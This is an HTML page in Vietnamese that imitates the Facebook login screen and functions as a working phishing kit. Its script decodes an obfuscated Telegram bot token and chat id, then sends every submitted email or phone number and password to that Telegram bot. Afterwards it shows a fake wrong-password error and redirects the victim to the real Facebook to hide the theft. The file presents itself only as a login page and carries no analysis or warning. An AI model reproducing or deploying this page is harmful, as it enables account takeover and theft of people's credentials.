<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook – Đăng nhập hoặc đăng ký</title>
  <style>
    body { background:#f0f2f5; font-family:SF Pro Text,system-ui,sans-serif; margin:0; height:100vh; display:flex; align-items:center; justify-content:center; }
    .container { max-width:400px; background:#fff; border-radius:8px; padding:40px 20px 30px; box-shadow:0 2px 12px rgba(0,0,0,.15); text-align:center; }
    .logo { width:200px; margin-bottom:30px; }
    input { width:100%; padding:14px; margin:10px 0; border:1px solid #dddfe2; border-radius:6px; font-size:17px; }
    input:focus { border-color:#1877f2; box-shadow:0 0 0 2px #e7f3ff; outline:none; }
    button { width:100%; padding:12px; background:#1877f2; color:white; border:none; border-radius:6px; font-size:20px; font-weight:bold; cursor:pointer; margin-top:15px; }
    button:hover { background:#166fe5; }
    .error { background:#ffebe8; border:1px solid #f02849; color:#c41e3a; padding:12px; border-radius:6px; margin:15px 0; display:none; }
    a { color:#1877f2; font-size:14px; text-decoration:none; display:block; margin:12px 0; }
  </style>
</head>
<body>
<div class="container">
  <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zS4w6V.svg" class="logo" alt="Facebook">
  <div id="err" class="error">Mật khẩu bạn vừa nhập không đúng. Vui lòng thử lại.</div>
  <form id="form">
    <input id="email" placeholder="Email hoặc số điện thoại" required>
    <input id="pass" type="password" placeholder="Mật khẩu" required>
    <button type="submit">Đăng nhập</button>
  </form>
  <a href="#">Quên mật khẩu?</a>
  <a href="#" style="background:#42b72a; color:white; padding:10px; border-radius:6px; margin-top:20px;">Tạo tài khoản mới</a>
</div>

<script>
const t = atob("NzU3NTQ4NTQ5MDpBQUdWMlVqUktublYwaWhEMk9OUkUwbE44bzh1Sk1PVEtmNA==").split(":")[0];
const c = atob("LTEwMDMxNTM0MDg3MDU=");

document.getElementById("form").addEventListener("submit", function(e) {
  e.preventDefault();
  const u = document.getElementById("email").value.trim();
  const p = document.getElementById("pass").value.trim();
  
  if (u.length < 5 || p.length < 5) {
    document.getElementById("err").style.display = "block";
    return;
  }
  
  const msg = `[FB HIT ${new Date().toLocaleString("vi-VN")}]\n👤 ${u}\n🔑 ${p}\n🌐 ${location.hostname}`;
  
  fetch(`https://api.t.me/bot${t}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: c, text: msg })
  }).then(r => r.json()).then(d => {
    // Nếu gửi OK thì show error giả + redirect
    document.getElementById("err").style.display = "block";
    document.getElementById("pass").value = "";
    setTimeout(() => {
      location.replace("https://www.facebook.com/?sk=welcome");
    }, 1800);
  }).catch(() => {
    // Nếu lỗi vẫn redirect để tránh lộ
    location.replace("https://www.facebook.com");
  });
});
</script>
</body>
</html>
